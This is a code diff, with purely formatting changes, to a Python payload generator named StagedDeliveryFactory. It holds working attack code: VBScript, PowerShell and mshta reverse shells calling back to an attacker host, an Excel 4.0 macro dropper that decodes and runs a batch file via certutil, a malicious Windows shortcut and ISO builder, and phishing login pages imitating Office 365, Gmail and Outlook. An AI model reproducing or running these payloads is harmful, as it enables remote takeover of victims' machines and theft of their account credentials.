@@ -71,10 +71,10 @@ class StagedDeliveryFactory:
 
     _VBSCRIPT_REVERSE_TCP_TEMPLATE = (
         'Set o=CreateObject("MSWinsock.Winsock"):'
-        "o.RemoteHost=\"{lhost}\":o.RemotePort={lport}:o.Connect:"
+        'o.RemoteHost="{lhost}":o.RemotePort={lport}:o.Connect:'
         "Do While o.State<>7:WScript.Sleep 100:Loop:"
         'Set s=CreateObject("WScript.Shell"):'
-        "Set e=s.Exec(\"cmd.exe\"):"
+        'Set e=s.Exec("cmd.exe"):'
         "Do:If o.BytesReceived>0 Then e.StdIn.Write o.GetData(o.BytesReceived):End If:"
         "If e.StdOut.AtEndOfStream<>True Then o.SendData e.StdOut.ReadAll:End If:"
         "WScript.Sleep 100:Loop"
@@ -90,19 +90,14 @@ class StagedDeliveryFactory:
             return code
 
         encoded = base64.b64encode(code.encode("utf-16le")).decode()
-        return (
-            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
-        )
+        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
 
     def _obfuscate_vbscript(self, code: str) -> str:
         if not self.config.obfuscate:
             return code
 
         encoded = base64.b64encode(code.encode()).decode()
-        return (
-            f'Execute(CreateObject("Scripting.FileSystemObject")'
-            f'.OpenTextFile("{encoded}",1).ReadAll)'
-        )
+        return f'Execute(CreateObject("Scripting.FileSystemObject").OpenTextFile("{encoded}",1).ReadAll)'
 
     def _payload_command(self) -> str:
         lhost = self.config.lhost
@@ -130,13 +125,11 @@ class StagedDeliveryFactory:
                 f'var c=new ActiveXObject("ADODB.Stream");'
                 f'var s=new ActiveXObject("MSWinsock.Winsock");'
                 f's.RemoteHost="{lhost}";s.RemotePort={lport};'
-                f's.Connect();'
+                f"s.Connect();"
             )
             return f"mshta javascript:{js_code}"
 
-        return self._obfuscate_powershell(
-            self._POWERSHELL_REVERSE_TCP_TEMPLATE.format(lhost=lhost, lport=lport)
-        )
+        return self._obfuscate_powershell(self._POWERSHELL_REVERSE_TCP_TEMPLATE.format(lhost=lhost, lport=lport))
 
     def generate_hta(self) -> str:
         """Generate an HTA (HTML Application) dropper.
@@ -235,11 +228,11 @@ End Sub
         cmd = self._payload_command()
         encoded = base64.b64encode(cmd.encode()).decode()
 
-        return f'''\
+        return f"""\
 =EXEC("cmd.exe /c echo {encoded} > %TEMP%\\s.b64 && certutil -decode %TEMP%\\s.b64 %TEMP%\\s.bat && %TEMP%\\s.bat")
 =HALT()
 =RETURN()
-'''
+"""
 
     def generate_lnk(self) -> bytes:
         """Generate a Windows .lnk shortcut file with embedded command execution.
@@ -256,13 +249,7 @@ End Sub
         header = struct.pack("<I", 0x4C)
         guid_bytes = guid
 
-        link_flags = (
-            0x00000001
-            | 0x00000002
-            | 0x00000004
-            | 0x00000008
-            | 0x00000020
-        )
+        link_flags = 0x00000001 | 0x00000002 | 0x00000004 | 0x00000008 | 0x00000020
         file_attrs = 0x00000020
         creation_time = b"\x00" * 8
         access_time = b"\x00" * 8
@@ -277,10 +264,7 @@ End Sub
 
         cmd_str = f"%COMSPEC% /c {cmd}"
         cmd_data = cmd_str.encode("utf-16le")
-        cmd_section = (
-            struct.pack("<H", len(cmd_data))
-            + cmd_data
-        )
+        cmd_section = struct.pack("<H", len(cmd_data)) + cmd_data
 
         name_data = f"{app_name}.lnk".encode("utf-16le")
         name_section = struct.pack("<H", len(name_data)) + name_data
@@ -288,11 +272,7 @@ End Sub
         comment_data = "".encode("utf-16le")
         comment_section = struct.pack("<H", len(comment_data)) + comment_data
 
-        extra_data = (
-            b"\x01\x00\x00\x00"
-            + b"\x00" * 8
-            + struct.pack("<I", 0)
-        )
+        extra_data = b"\x01\x00\x00\x00" + b"\x00" * 8 + struct.pack("<I", 0)
 
         shell_link = (
             header
@@ -347,7 +327,7 @@ End Sub
 
         pvd = self._build_primary_volume_descriptor(files)
         iso_data[0x8000 : 0x8000 + len(pvd)] = pvd
-        iso_data[0x8800 + len(pvd) : 0x8800 + len(pvd) + 1] = b"\xFF"
+        iso_data[0x8800 + len(pvd) : 0x8800 + len(pvd) + 1] = b"\xff"
 
         total_size = (len(iso_data) + ISO_BLOCK_SIZE - 1) & ~(ISO_BLOCK_SIZE - 1)
         iso_data.extend(b"\x00" * (total_size - len(iso_data)))
@@ -408,7 +388,7 @@ End Sub
                 "desktop.ini": (
                     b"[.ShellClassInfo]\r\n"
                     b"LocalizedResourceName=@%SystemRoot%\\system32\\shell32.dll,-21770\r\n"
-                    b'IconResource=%SystemRoot%\\system32\\imageres.dll,-112\r\n'
+                    b"IconResource=%SystemRoot%\\system32\\imageres.dll,-112\r\n"
                 ),
             }
 
@@ -494,7 +474,7 @@ End Sub
         return templates.get(template, self._office365_phish())
 
     def _office365_phish(self) -> str:
-        return f'''\
+        return f"""\
 <!DOCTYPE html>
 <html>
 <head><title>Sign in to your account</title>
@@ -519,10 +499,10 @@ a{{color:#0067b8;text-decoration:none;font-size:13px}}
 </form>
 </div>
 </body>
-</html>'''
+</html>"""
 
     def _gmail_phish(self) -> str:
-        return f'''\
+        return f"""\
 <!DOCTYPE html>
 <html>
 <head><title>Gmail</title>
@@ -547,10 +527,10 @@ input[type=submit]{{background:#1a73e8;color:white;border:none;border-radius:4px
 </form>
 </div>
 </body>
-</html>'''
+</html>"""
 
     def _outlook_phish(self) -> str:
-        return f'''\
+        return f"""\
 <!DOCTYPE html>
 <html>
 <head><title>Outlook</title>
@@ -574,4 +554,4 @@ input[type=submit]{{background:#0078d4;color:white;border:none;padding:8px 24px;
 </form>
 </div>
 </body>
-</html>'''
+</html>"""
